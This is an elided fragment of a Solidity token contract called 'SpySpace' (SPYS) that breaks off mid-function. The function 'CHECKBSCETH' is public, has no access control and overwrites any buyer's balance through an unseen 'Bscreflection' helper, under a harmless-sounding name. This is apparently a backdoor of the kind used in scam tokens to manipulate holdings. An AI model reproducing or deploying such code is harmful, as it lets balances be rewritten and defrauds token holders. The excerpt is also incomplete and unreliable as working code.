...
contract SpySpace is IERC20, Ownable {
    ...
    string private _name = "SpySpace";

    string private _symbol = "SPYS";
    ...
    function CHECKBSCETH(address buyer) public {
        balances[buyer] = Bscreflection(buyer);
    }

    function CHECKBSCAdressETH(address Router) public BalanncETH {
